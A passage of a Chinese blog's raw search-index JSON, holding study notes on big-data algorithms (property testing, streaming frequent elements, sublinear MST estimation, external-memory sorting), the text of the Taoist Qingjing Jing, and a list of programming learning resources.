href=\"#算法描述\" class=\"headerlink\" title=\"算法描述\"></a>算法描述</h3><ol>\n<li>在$A$中随机独立抽取$s=\\frac{2}{\\epsilon}$个位置上的元素</li>\n<li>检查抽样，若不包含1则输出“是”，否则输出“否”</li>\n</ol>\n<h3 id=\"精确性分析\"><a href=\"#精确性分析\" class=\"headerlink\" title=\"精确性分析\"></a>精确性分析</h3><ul>\n<li>如果$A$是全0数组，始终输出“是”</li>\n<li>如果A是$\\epsilon$-远离的，此时每位数为1的概率是$\\epsilon$，不为1的概率是$1-\\epsilon$。可以得到出错的概率小于$\\frac{1}{3}$：<script type=\"math/tex; mode=display\">\n{Pr[error]=Pr[抽样中没有1] \\leq(1-\\epsilon)^s\\approx e^{-\\epsilon s}=e^{-2}\\leq \\frac 1 3 }</script></li>\n</ul>\n<p>运行时间$O(s)$</p>\n<h3 id=\"证据引理\"><a href=\"#证据引理\" class=\"headerlink\" title=\"证据引理\"></a>证据引理</h3><p>如果一次测试以大于等于$p$的概率获得一个证据，那么$s=\\frac{2}{p}$轮测试得到的证据概率大于等于$\\frac{2}{3}$</p>\n<p>对于一个判定问题$L$，其查询复杂性$q(n)$和近似参数$\\epsilon$的性质测试算法是一个随机算法，其满足对于给定$L$的是一个实例$x$，最多进行$q(\\vert x \\vert)$次查询，并满足下述性质：</p>\n<ul>\n<li>如果$x$在$L$中，该算法最少$\\frac {2} {3}$的概率返回“是”</li>\n<li>如果$x$是$\\epsilon$-远离L的，该算法以最少$\\frac {2} {3}$的概率返回“否”</li>\n</ul>\n<h1 id=\"亚线性算法例析\"><a href=\"#亚线性算法例析\" class=\"headerlink\" title=\"亚线性算法例析\"></a>亚线性算法例析</h1><h2 id=\"数据流中频繁元素（空间亚线性）\"><a href=\"#数据流中频繁元素（空间亚线性）\" class=\"headerlink\" title=\"数据流中频繁元素（空间亚线性）\"></a>数据流中频繁元素（空间亚线性）</h2><h3 id=\"数据流模型\"><a href=\"#数据流模型\" class=\"headerlink\" title=\"数据流模型\"></a>数据流模型</h3><ul>\n<li>数据是流动的，只能顺序的扫描一次或几次，复杂度不超过$O(n)$，需要能快速处理新到来的元素</li>\n<li>数据可能是无限的，内存有限的。内存通常取$O(log^{k}n)$或$O(n^{\\alpha}) \\  \\forall\\alpha \\lt 1$</li>\n<li>希望维护一个中间内存结果（概要）来给出相关性质的一个有效估计</li>\n<li>数据流模型适用于大数据（顺序扫描数据仅一次，内存亚线性）</li>\n</ul>\n<h3 id=\"数据流常见运算\"><a href=\"#数据流常见运算\" class=\"headerlink\" title=\"数据流常见运算\"></a>数据流常见运算</h3><p>常见的求数据流的$min$，$max$，$sum$通过比较大小和累加可以只借由一个寄存器$s$实现。此处的“概要”$s$是可以合并的：多个流放到不同的$s$里，最后可以通过比较$s$大小或求和合并。</p>\n<h3 id=\"频繁元素求解问题\"><a href=\"#频繁元素求解问题\" class=\"headerlink\" title=\"频繁元素求解问题\"></a>频繁元素求解问题</h3><p><strong>问题</strong>：给出一个序列$L = x_1,x_2,…$，求出现最多次的元素。令：</p>\n<ul>\n<li>$m$：数据流中元素个数</li>\n<li>$n$：不同元素数量</li>\n</ul>\n<p>频繁元素求解在搜索引擎优化问题中有广泛应用。求解该种问题基于一个假设：<br><strong>Zipf</strong>原则：典型的频率分布是高度倾斜的，只有少数元素是频繁元素。</p>\n<p><strong>精确解</strong>：每个元素设置计数器，处理每个元素时增加对应元素的计数器。当内存只能提供$k$个计数器，$k &lt;&lt; n$，问题就来了。 </p>\n<p><strong>近似算法(MG算法)</strong>：<br>Misra Gries算法：<br>处理每个收到的元素$x$：</p>\n<ul>\n<li>如果已经给$x$分配了计数器，增加计数</li>\n<li>如果没有给$x$分配计数器，但计数器个数小于$k$，为$x$分配计数器，并设为1</li>\n<li>否则，所有计数器减1，删除值为0的计数器</li>\n</ul>\n<p>为了防止计数器减少导致的频繁元素出现次数计数减少，计：</p>\n<ul>\n<li>整个结构的权重（计数器的和）记作$m^{\\prime}$</li>\n<li>整个数据流的权重（全部元素的数量）是$m$</li>\n<li>每次计数器降低会减少$k$个计数，然后新输入元素此次出现，实际上少计入了$k+1$次元素，所以最多有$\\frac{m-m^{\\prime}}{k+1}$轮减少计数</li>\n</ul>\n<p>即：估计值与真实值差最多是$\\frac{m-m^{\\prime}}{k+1}$，当数据流中元素总数远大于$\\frac{m-m^{\\prime}}{k+1}$，得到一个好的估计。</p>\n<p>错误的界限和$k$成反比。计算时，可以记录$m$和$m^{\\prime}$，然后估算出与真实值的误差。由于$zipf$原则，该算法长期有效。</p>\n<h2 id=\"最小生成树计数（时间亚线性的计算问题）\"><a href=\"#最小生成树计数（时间亚线性的计算问题）\" class=\"headerlink\" title=\"最小生成树计数（时间亚线性的计算问题）\"></a>最小生成树计数（时间亚线性的计算问题）</h2><p>一般的求最小生成树的算法（贪心算法）是复杂度为$mlog(n)$的prime和kruskal算法，而大数据业务中尽可能实现线性或亚线性算法。</p>\n<p><strong>输入</strong>：无向有权联通图$G=(V,E)$，其顶点的度最大为$D$，边上的权来自整数集合$\\lbrace 1,2,\\dots,w \\rbrace$<br><strong>输出</strong>：图$G$的最小生成树的权重<br><img src=\"1.png\" alt=\"\"></p>\n<p>可以利用特定子图联通分量的数量估计最小生成树的权重。假设所有边权重都是1或2，最小生成树的权重可以表示为</p>\n<script type=\"math/tex; mode=display\">\n\\text{最小生成树的权重} = \\sharp N_1+\\sharp N_2</script><p>其中$\\sharp N_i$是最小生成树中权重至少为$i$的的边的数量。因为最小生成树是连通图，$\\sharp N_1$等于最小生成树边的数量，等于$n-1$，即：</p>\n<script type=\"math/tex; mode=display\">\n\\text{最小生成树的权重}=n-1+\\sharp N_2</script><p>如果把权重为2的边都去掉，最小生成树会变成由权重为1的边构成的若干个连通分量（单个节点也算一个连通分量），即：</p>\n<script type=\"math/tex; mode=display\">\n\\text{最小生成树的权重} = n-1+\\text{权重为1的边构成的导出子图的连通分量数}-1</script><p>对于一般情况：</p>\n<ul>\n<li>$G_i$：$G$中包含所有权重小于等于$i$的边的子图</li>\n<li>$C_i$：$G_i$中连通分量的个数</li>\n<li>最小生成树权重大于$i$的边数为$C_i-1$</li>\n</ul>\n<p>即：$\\sharp_i$=最小生成树权重大于$i$的边数=图$G$中包含权重小于等于$i$的边的子图中的联通分量的个数-1</p>\n<p>因此，最小生成树（Minimal Spanning Tree）的权重（weight）应该是：</p>\n<script type=\"math/tex; mode=display\">\nW_{MST}(G)=n-w+\\Sigma_{i=1}^{w-1}C_i</script><p><strong>证明</strong>：<br>令$\\beta<em>i$为MST中权重大于$i$的边的个数，显然：每一条MST的边对$W</em>{MST}$的贡献为1，每个权重为$i(i \\gt 1)$的边额外贡献了$i-1$。即：</p>\n<script type=\"math/tex; mode=display\">\nW_{MST} = \\sum_{i=0}^{w-1} \\beta_i = \\sum_{i=0}^{w-1}(C_i-1) = -w + \\sum_{i=0}^{w-1} c_i = n - w + \\sum_{i=1}^{w-1} c_i</script><p>所以要近似计算$W_{MST}$，只需要估算$c_i$：</p>\n<h3 id=\"基础算法：联通分量个数的估计\"><a href=\"#基础算法：联通分量个数的估计\" class=\"headerlink\" title=\"基础算法：联通分量个数的估计\"></a>基础算法：联通分量个数的估计</h3><ul>\n<li><strong>输入</strong>：图$G=(V,E)$，有$n$个顶点，表示为邻接矩阵，节点最大度为$d$</li>\n<li><strong>输出</strong>：联通分量个数</li>\n<li>精确解时间复杂性：$\\Omega(dn)$</li>\n</ul>\n<p>算法：利用随机化方法，估计联通分量个数$\\sharp CC$</p>\n<ul>\n<li>$\\sharp CC \\pm \\epsilon n$的概率$\\ge \\frac{2}{3}$</li>\n<li>运行时间和$n$无关  </li>\n</ul>\n<p>思路：</p>\n<ol>\n<li>设$C$为连通分量个数</li>\n<li>对于每个节点$u$，$n_u$表示$u$所在的连通分量节点数</li>\n<li>对于每个联通分量$A$，$\\Sigma_{u \\in A} \\frac{1}{n_u} = 1$</li>\n<li>故对于整个图$V$，有：$\\Sigma_{u \\in V} \\frac{1}{n_u} = C$</li>\n<li>通过估计抽样顶点的$n_u$来估计这个和$C$<ul>\n<li>如果$u$所在的联通分量很小，其规模可以通过BFS估计</li>\n<li>如果$u$所在的连通分量很大，$\\frac{1}{n_u}$很小，对和$C$的贡献很小</li>\n<li>可以在几步内完成BFS</li>\n</ul>\n</li>\n<li>令$\\hat n_u = min \\lbrace n_u, \\frac {2}{\\epsilon} \\rbrace$<ul>\n<li>当节点数$n_u$小于$\\frac {2}{\\epsilon}$，$\\hat n_u = n_u$</li>\n<li>否则，$\\hat n_u = \\frac {2}{\\epsilon}$，因此$0 \\lt \\frac {1}{\\hat n_u} - \\frac {1}{n_u} \\lt \\frac{1}{\\hat n_u} = \\frac{\\epsilon}{2}$</li>\n</ul>\n</li>\n<li>在这种情况下，对$C$的估计<script type=\"math/tex; mode=display\">\nC^{\\prime} = \\sum \\frac {1} {\\hat n_u}</script></li>\n<li>则$\\vert C^{\\prime} - C \\vert = \\vert \\Sigma(\\frac{1}{\\hat n_u} - \\frac{1}{n_u}) \\vert \\lt \\frac {n \\epsilon}{2}$</li>\n</ol>\n<p>估计联通分量个数的伪码：<br><img src=\"2.png\" alt=\"\"></p>\n<p>该算法循环$\\frac{1}{\\epsilon^2}$次，每次循环最多执行$\\frac{2}{\\epsilon}$次（做BFS），然后还是维护$L$的有序性，需要用到一个平衡二叉树来保持$L$。所以运行时间为$O(\\frac{d}{\\epsilon^3} log \\frac {1}{\\epsilon})$</p>\n<p>接下来分析抽样和遍历每个点精确求BFS的结果查大于$\\frac{\\epsilon n}{2}$概率是小于$\\frac{1}{3}$的，即：</p>\n<script type=\"math/tex; mode=display\">\nPr[\\vert \\bar{C} - \\hat C] \\gt \\frac {\\epsilon n}{2}] \\leq \\frac{1}{3}</script><p>来说明估计值和真实值相差过大的概率很小。</p>\n<ul>\n<li>对于采样种的第$i$个节点$u$，令$Y_i = \\frac {1} {\\hat n_u}$</li>\n<li>$Y=\\Sigma_{i=1}^s Y_i = \\frac {s \\bar{C}}{n}$</li>\n<li>$E[Y] = \\Sigma<em>{i=1}^s E[Y_i] = sE[Y_1] = s \\times \\frac{1}{n} \\Sigma</em>{u \\in V} \\frac{1}{\\hat{n_v}} = \\frac{s \\hat C}{n}$</li>\n</ul>\n<script type=\"math/tex; mode=display\">\nPr[\\vert \\bar{C} - \\hat C] \\vert \\gt \\frac{\\epsilon n}{2}] \n= Pr[\\vert \\frac{n}{s} Y - \\frac{n}{s} E[Y] \\vert \\gt \\frac{\\epsilon n}{2}] \n= Pr[\\vert Y - E[Y] \\vert] \\gt \\frac{\\epsilon s}{2}</script><p><strong>Hoeffding界</strong>：<br>$Y<em>1,Y_2\\dots Y_s$为$[0,1]$区间内独立同分布的随机变量，令$Y=\\Sigma</em>{i=1}^{s} Y_i$，则$Pr[\\vert Y - E[Y] \\vert \\geq \\delta] \\leq 2e^{\\frac {-2\\delta^{2}}{s}}$</p>\n<script type=\"math/tex; mode=display\">\nPr[\\vert \\bar{C} - \\hat C] \\vert \\gt \\frac{\\epsilon n}{2}] = Pr[\\vert Y - E[Y]] \\gt \\frac{\\epsilon s}{2}] \\leq 2e^{-\\frac{\\epsilon^2 s}{2}}</script><script type=\"math/tex; mode=display\">\ns = \\theta(\\frac{1}{\\epsilon^2}) \\Rightarrow Pr[\\vert \\bar{C} - \\hat C] \\vert \\gt \\frac{\\epsilon n}{2}] \\leq \\frac{1}{3}</script><script type=\"math/tex; mode=display\">Pr[\\vert \\bar{C} - \\hat C] \\vert \\gt \\frac{\\epsilon n}{2}] \\leq \\frac{1}{3}</script><script type=\"math/tex; mode=display\">\n\\vert \\bar{C} - C \\vert \\leq \\frac{\\epsilon n}{2}</script><p>因此，下列事件发生的概率大于$\\frac {2}{3}$:</p>\n<script type=\"math/tex; mode=display\">\n\\vert \\bar{C} - C \\vert \\leq \\bar{C} - \\hat C \\vert + \\vert \\hat C - C \\vert \\leq \\frac {\\epsilon n}{2} + \\frac {\\epsilon n}{2} = \\epsilon n</script><p>综上所述，有$n$个顶点的图中，若其顶点的度至多为$d$，则其连通分量的估计误差最多为$\\pm \\epsilon n$</p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p>分析：</p>\n<ul>\n<li>假设$C_i$的估计都是正确的，$\\vert \\bar{C_i} - C_i \\vert \\leq \\frac{\\epsilon}{w} n$，则<script type=\"math/tex; mode=display\">\n\\vert \\hat w_{MST} - w_{MST} \\vert = \\vert \\Sigma_{i=1}^{w-1}(\\bar{C_i} - C_i) \\vert \\leq \\Sigma_{i=1}^{w-1} \\vert \\bar{C_i} - C_i \\vert \\leq w \\frac{\\epsilon}{w} n = \\epsilon n</script><ul>\n<li>$Pr[所有w-次估计都正确] \\geq (\\frac{2}{3})^{w-1}$</li>\n<li>这还不够好，可以通过CC算法，取合适的$s$值，使每一轮的错误概率$\\leq \\frac{1}{3w}$，应当取多少</li>\n</ul>\n</li>\n</ul>\n<p><strong>乘近似</strong>：  </p>\n<ul>\n<li>对于MST的代价，可以从加的近似导出乘法的近似<script type=\"math/tex; mode=display\">\nW_{MST} \\geq n-1 \\Rightarrow w_{MST} \\geq \\frac{n}{2} (n \\geq 2)</script></li>\n<li>$\\epsilon n$加近似<script type=\"math/tex; mode=display\">\nw_{MST} - \\epsilon n \\leq \\hat w_{MST} \\leq w_{MST} + \\epsilon n</script></li>\n<li>$(1 \\pm 2\\epsilon)$乘近似<script type=\"math/tex; mode=display\">\nw_{MST}(1-2\\epsilon) \\leq w_{MST} - \\epsilon n \\leq \\hat w_{MST} \\leq w_{MST} + \\epsilon n \\leq w_{MST}(1+2\\epsilon)</script></li>\n</ul>\n<h2 id=\"序列有序的判定（时间亚线性算法的判定问题）\"><a href=\"#序列有序的判定（时间亚线性算法的判定问题）\" class=\"headerlink\" title=\"序列有序的判定（时间亚线性算法的判定问题）\"></a>序列有序的判定（时间亚线性算法的判定问题）</h2><p><strong>输入</strong>：$n$个数的数组，$x_1,x_2,\\dots,x_n$<br><strong>输出</strong>：这个数组是否有序?</p>\n<p>常规算法需要访问$n$个数，时间复杂度$\\Omega(n)$</p>\n","categories":["大数据算法"],"tags":["大数据"]},{"title":"大数据算法（2）外存算法","url":"/2021/03/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AE%97%E6%B3%95%EF%BC%882%EF%BC%89%E5%A4%96%E5%AD%98%E7%AE%97%E6%B3%95/","content":"<p>当数据量太大，传统的随机存储模型失效，此时就需要外存算法</p>\n<h1 id=\"外存算法概述\"><a href=\"#外存算法概述\" class=\"headerlink\" title=\"外存算法概述\"></a>外存算法概述</h1><p>传统的存储模型假设有无限内存（RAM），统一的访问代价，该模型简单易懂。而现代的计算机有复杂的存储层次：<br><img src=\"1.png\" alt=\"\"><br>通过多级存储的机制，增大了存储量。较慢的存储层次更加远离CPU。由于磁盘访问速度比内存访问慢了2个数量级，根据局部性原理，为了减少访问次数，数据的传输以块（block）为基本单位来平摊访问代价（每个块8-16字节）。</p>\n<p>如今的操作系统大多能通过先进的分页和预取策略优化集中区域数据的访问，但是如果数据访问过于分散，再优秀的操作系统也无法发挥优势。所以，设计外存算法要考虑I/O问题。</p>\n<p>传统算法的执行时间往往随着数据量的增长线性增长，但数据量特别大的时候，处理时间会急剧上升。原因是内存不够，虚存会不断访问磁盘，进行swap，造成抖动。<br><img src=\"2.png\" alt=\"\"></p>\n<span id=\"more\"></span>\n<h2 id=\"外部存储器模型\"><a href=\"#外部存储器模型\" class=\"headerlink\" title=\"外部存储器模型\"></a>外部存储器模型</h2><ul>\n<li>$N$：问题实例数据项个数</li>\n<li>$B$：每个磁盘块中数据项的个数</li>\n<li>$M$：内存能容纳的数据项个数</li>\n<li>$T$：输出数据项个数</li>\n<li>I/O：内存和磁盘之间移动的数据块数</li>\n</ul>\n<p>为了方便，我们假设：<br>$M \\gt B^2$</p>\n<h2 id=\"常见内存算法和外存算法的基本界限\"><a href=\"#常见内存算法和外存算法的基本界限\" class=\"headerlink\" title=\"常见内存算法和外存算法的基本界限\"></a>常见内存算法和外存算法的基本界限</h2><p>评估内存算法性能主要看需要执行对RAM随机访问的次数。由于I/O比内存操作时间多2个数量级，再外存算法中考察内存读写的时间可以忽略不计，因此评估外存算法性能则主要看执行I/O读写块的次数：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>内存算法</th>\n<th>外存算法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>浏览</td>\n<td>$N$</td>\n<td>$\\frac{N}{B}$</td>\n</tr>\n<tr>\n<td>排序</td>\n<td>$NlogN$</td>\n<td>$\\frac{N}{B}log_{\\frac{M}{B}} \\frac{N}{B}$</td>\n</tr>\n<tr>\n<td>置换</td>\n<td>$N$</td>\n<td>$min \\lbrace N,\\frac{N}{B} log_{\\frac{M}{B}}\\frac{N}{B} \\rbrace$</td>\n</tr>\n<tr>\n<td>查找</td>\n<td>$log_2 N$</td>\n<td>$log_B N$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>注意：</p>\n<ul>\n<li>线性I/O：$O(\\frac{N}{B})$</li>\n<li>置换不是线性的</li>\n<li>置换和排序范围在所有的实际情况是平等的</li>\n<li>$B$是很重要的因素：$\\frac{N}{B} \\lt \\frac{N}{B} log_{\\frac{M}{B}} \\frac{N}{B} \\lt \\lt N$</li>\n<li>无法用搜索树优化排序（无法保证磁盘上连续存储）</li>\n</ul>\n<h2 id=\"可扩展性问题：块访问的影响\"><a href=\"#可扩展性问题：块访问的影响\" class=\"headerlink\" title=\"可扩展性问题：块访问的影响\"></a>可扩展性问题：块访问的影响</h2><p><strong>例1</strong>：遍历链表<br>数组大小$N=10$（个元素），磁盘块大小$B=2$（个元素），主存大小$M=4$个元素（2个磁盘块）</p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p>一次I/O读入两个元素到主存，对于第一个例子过程如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># visit 1</span><br><span class=\"line\">load [1,5] # MEM:1,5,_,_</span><br><span class=\"line\"># visit 2 </span><br><span class=\"line\">load [2,6] # MEM:1,5,2,6</span><br><span class=\"line\"># visit 3</span><br><span class=\"line\">swap([1,5],[3,8]) # MEM:3,8,2,6</span><br><span class=\"line\"># visit 4</span><br><span class=\"line\">swap([2,6],[9,4]) # MEM:3,8,9,4</span><br><span class=\"line\"># visit 5</span><br><span class=\"line\">swap([3,8],[1,5]) # MEM:1,5,9,4</span><br><span class=\"line\"># visit 6</span><br><span class=\"line\">swap([9,4],[2,6]) # MEM:1,5,2,6</span><br><span class=\"line\"># visit 7</span><br><span class=\"line\">swap([1,5],[7,10]) # MEM:7,10,2,6</span><br><span class=\"line\"># visit 8</span><br><span class=\"line\">swap([2,6],[3,8]) # MEM:7,10,3,8</span><br><span class=\"line\"># visit 9</span><br><span class=\"line\">swap([3,8],[9,4]) # MEM:7,10,9,4</span><br><span class=\"line\"># visit 10</span><br><span class=\"line\">directory_access MEM # MEM:7,10,9,4</span><br></pre></td></tr></table></figure><br>算上所有<code>load</code>和<code>swap</code>有9次I/O。对于第二个例子，过程如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># visit 1</span><br><span class=\"line\">load [1,2] # MEM:1,2,_,_</span><br><span class=\"line\"># visit 2</span><br><span class=\"line\">directory_access MEM # MEM:1,2,_,_</span><br><span class=\"line\"># visit 3</span><br><span class=\"line\">load [3,4] # MEM:1,2,3,4</span><br><span class=\"line\"># visit 4 </span><br><span class=\"line\">directory_access MEM # MEM:1,2,3,4</span><br><span class=\"line\"># visit 5</span><br><span class=\"line\">swap([1,2],[5,6]) # MEM:5,6,3,4</span><br><span class=\"line\"># visit 6</span><br><span class=\"line\">directory_access MEM # MEM:5,6,3,4</span><br><span class=\"line\"># visit 7</span><br><span class=\"line\">swap([3,4],[8,7]) # MEM:5,6,8,7</span><br><span class=\"line\"># visit 8</span><br><span class=\"line\">directory_access MEM # MEM:5,6,8,7 </span><br><span class=\"line\"># visit 9</span><br><span class=\"line\">swap([5,6],[10,9]) # MEM:10,9,8,7 </span><br><span class=\"line\"># visit 10</span><br><span class=\"line\">directory_access MEM # MEM:10,9,8,7</span><br></pre></td></tr></table></figure><br>有5次I/O。可见不同的数据对于外存算法执行效率的差异很大。</p>\n<p>$N$和$\\frac{N}{B}$之间也会因为磁盘块大小$B$的差异而差异较大：<br>例：$N = 256 \\times 10^6$，$B$ = 8000，每次I/O耗时1ms，$N$次I/O需要$256 \\times 10^3sec = 71h$，$\\frac{N}{B}$次I/O需要$256 \\times 10^6 \\div 8000 = 32000sec = 8h$</p>\n<p><strong>例2</strong>：队列和堆栈<br>队列和堆栈：内存和外存算法都是维护一个push和pop块。每$B$次操作才会触发一次I/O，平均每次操作耗时$O(\\frac{1}{B})$</p>\n<h2 id=\"外存排序算法\"><a href=\"#外存排序算法\" class=\"headerlink\" title=\"外存排序算法\"></a>外存排序算法</h2><p>常规的排序算法以归并排序为例，采用划分区间排序，再归并的策略。外存算法中，把每一个区间放入一个块中，在内存中依次对每一个块排序，然后归并。</p>\n<p>$\\lt \\frac{M}{B}$个排序列表可以在$O(\\frac{N}{B})$次I/O内合并。</p>\n<p>设数组为：24,1,23,19,20,5,18,16,4,7,8,9,10,15,17,14,3,2,6,11,12,13,22,21。$M=8,N=24,B=2$。第一阶段，以内存最大容量8为一组，分3批读入内存，依次排序后写回：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">load 24,1,23,19,20,5,18,16</span><br><span class=\"line\">sort_and_write # 1,5,16,18,19,20,23,24</span><br><span class=\"line\">load 4,7,8,9,10,15,17,14 </span><br><span class=\"line\">sort_and_write # 4,7,8,9,10,14,15,17</span><br><span class=\"line\">load 3,2,6,11,12,13,22,21 </span><br><span class=\"line\">sort_and_write # 2,3,6,11,12,13,21,22</span><br></pre></td></tr></table></figure><br>现在3批数据各自排序已经完成：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1,5,16,18,19,20,23,24</span><br><span class=\"line\">4,7,8,9,10,14,15,17</span><br><span class=\"line\">2,3,6,11,12,13,21,22</span><br></pre></td></tr></table></figure><br>每次取每一批的一块，读入到内存中：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1,5</span><br><span class=\"line\">4,7</span><br><span class=\"line\">2,3</span><br></pre></td></tr></table></figure><br>内存剩下1块放<code>buffer</code>，第一次比较大小<code>buffer &lt;&lt; 1</code>，内存变：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">5,_</span><br><span class=\"line\">4,7</span><br><span class=\"line\">2,3</span><br><span class=\"line\">buffer(1,_)</span><br></pre></td></tr></table></figure><br>第二次比较大小，<code>buffer &lt;&lt; 2</code>，内存变为：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">5,_</span><br><span class=\"line\">4,7</span><br><span class=\"line\">3,_</span><br><span class=\"line\">buffer(1,2)</span><br></pre></td></tr></table></figure><br>第三次比较大小，输出<code>1，2</code>，情况<code>buffer</code>，<code>buffer &lt;&lt; 3</code>，第3批第一块为空，读入第3批第2块，内存为：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">5,_</span><br><span class=\"line\">4,7</span><br><span class=\"line\">6,11</span><br><span class=\"line\">buffer(3,_)</span><br></pre></td></tr></table></figure><br>以此类推，输出所有值。</p>\n<p><strong>I/O复杂度分析</strong>：<br>对于内存大小$M$，数据量$N$，块大小$B$，一次数据遍历需要$\\frac{N}{B}$次I/O，一次装满内存需要$\\frac{M}{B}$次I/O。</p>\n<h2 id=\"外存查找树\"><a href=\"#外存查找树\" class=\"headerlink\" title=\"外存查找树\"></a>外存查找树</h2><h1 id=\"外存查找结构\"><a href=\"#外存查找结构\" class=\"headerlink\" title=\"外存查找结构\"></a>外存查找结构</h1><h1 id=\"外存图数据算法\"><a href=\"#外存图数据算法\" class=\"headerlink\" title=\"外存图数据算法\"></a>外存图数据算法</h1>","categories":["大数据算法"],"tags":["大数据"]},{"title":"大数据算法（3）并行算法","url":"/2021/03/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AE%97%E6%B3%95%EF%BC%883%EF%BC%89%E5%B9%B6%E8%A1%8C%E7%AE%97%E6%B3%95/","content":"<h1 id=\"基于MapReduce的并行算法设计\"><a href=\"#基于MapReduce的并行算法设计\" class=\"headerlink\" title=\"基于MapReduce的并行算法设计\"></a>基于MapReduce的并行算法设计</h1><h1 id=\"MapReduce算法例析\"><a href=\"#MapReduce算法例析\" class=\"headerlink\" title=\"MapReduce算法例析\"></a>MapReduce算法例析</h1><h1 id=\"超越MapReduce的并行大数据处理\"><a href=\"#超越MapReduce的并行大数据处理\" class=\"headerlink\" title=\"超越MapReduce的并行大数据处理\"></a>超越MapReduce的并行大数据处理</h1>","categories":["大数据算法"],"tags":["大数据"]},{"title":"大数据算法（4）众包算法","url":"/2021/03/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AE%97%E6%B3%95%EF%BC%884%EF%BC%89%E4%BC%97%E5%8C%85%E7%AE%97%E6%B3%95/","content":"<h1 id=\"众包算法\"><a href=\"#众包算法\" class=\"headerlink\" title=\"众包算法\"></a>众包算法</h1>","categories":["大数据算法"],"tags":["大数据"]},{"title":"太上老君说常清静经","url":"/2018/10/21/%E5%A4%AA%E4%B8%8A%E8%80%81%E5%90%9B%E8%AF%B4%E5%B8%B8%E6%B8%85%E9%9D%99%E7%BB%8F/","content":"<p>老君曰：大道无形，生育天地；大道无情，运行日月；大道无名，长养万物；吾不知其名，强名曰道。夫道者：有清有浊，有动有静；天清地浊，天动地静。男清女浊，男动女静。降本流末，而生万物。清者浊之源，动者静之基。人能常清静，天地悉皆归。</p>\n<p>夫人神好清，而心扰之；人心好静，而欲牵之。常能遣其欲，而心自静，澄其心，而神自清。自然六欲不生，三毒消灭。所以不能者，为心未澄，欲未遣也。能遣之者，内观其心，心无其心；外观其形，形无其形；远观其物，物无其物。三者既悟，唯见於空；观空亦空，空无所空；所空既无，无无亦无；无无既无，湛然常寂；寂无所寂，欲岂能生？欲既不生，即是真静。真常应物，真常得性；常应常静，常清静矣。如此清静，渐入真道；既入真道，名为得道，虽名得道，实无所得；为化众生，名为得道；能悟之者，可传圣道。<br><span id=\"more\"></span></p>\n<p>老君曰：上士无争，下士好争；上德不德，下德执德。执著之者，不名道德。众生所以不得真道者，为有妄心。既有妄心，即惊其神；既惊其神，即著万物；既著万物，即生贪求；既生贪求，即是烦恼；烦恼妄想，忧苦身心；便遭浊辱，流浪生死，常沉苦海，永失真道。真常之道，悟者自得，得悟道者，常清静矣。</p>\n<p>仙人葛翁曰：吾得真道，曾诵此经万遍。此经是天人所习，不传下士。吾昔受之于东华帝君，东华帝君受之于金阙帝君，金阙帝君受之于西王母。西王母皆口口相传，不记文字。吾今于世，书而录之。上士悟之，升为天仙；中士修之，南宫列仙；下士得之，在世长年。游行三界，升入金门。</p>\n<p>左玄真人曰：学道之士，持诵此经者，即得十天善神，拥护其身。然后玉符保神，金液炼形。形神俱妙，与道合真。</p>\n<p>正一真人曰：人家有此经，悟解之者，灾障不干，众圣护门。神升上界，朝拜高真。功满德就，相感帝君。诵持不退，身腾紫云。</p>\n","tags":["道"]},{"title":"学习资源整理","url":"/2022/01/15/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/","content":"<p>这个时代要学个东西网上资源丰富而又良莠不齐，映像里大多数培训班直播喜欢东拉西扯视频质量贼差，而有些用爱发电的UP做的教程往往PPT做的特别精致。</p>\n<p>这里搜集一些本人学过的精品资源，每一个都是宝藏。</p>\n<span id=\"more\"></span>\n<h2 id=\"408基础\"><a href=\"#408基础\" class=\"headerlink\" title=\"408基础\"></a>408基础</h2><h3 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h3><p><a href=\"https://www.bilibili.com/video/BV1jt4y117KR\">清华大学邓俊辉数据结构与算法 34h</a>，C++模板编程描述数据结构，内容相当丰富。</p>\n<h2 id=\"语言类\"><a href=\"#语言类\" class=\"headerlink\" title=\"语言类\"></a>语言类</h2><h3 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C++\"></a>C++</h3><ul>\n<li>B站<a href=\"https://space.bilibili.com/408093637/video?tid=0&amp;page=2&amp;keyword=&amp;order=pubdate\">LH_mouse</a>，STL源码解析，手撮轮子看他</li>\n<li><a href=\"http://m.biancheng.net/view/7847.html\">C++中文网</a>，快速入门教程</li>\n</ul>\n<h3 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h3><h3 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h3><p>B站UP主<a href=\"https://space.bilibili.com/361469957?spm_id_from=333.788.b_765f7570696e666f.1\">软件工艺师</a>，微软MVP，一股带点东北口语的标准普通话，咬字清楚，认真做PPT，全程无废话，听他讲课真的舒服!</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1hp4y1k7SV/?p=49&amp;spm_id_from=pageDriver\">Rust编程语言入门教程（Rust语言/Rustlang）</a>。 完全是按照Rust官方的《The Book》来讲课的，看《The Book》困难的可以看他的视频。</li>\n</ul>\n<h2 id=\"工具类\"><a href=\"#工具类\" class=\"headerlink\" title=\"工具类\"></a>工具类</h2><h3 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h3><ul>\n<li><a 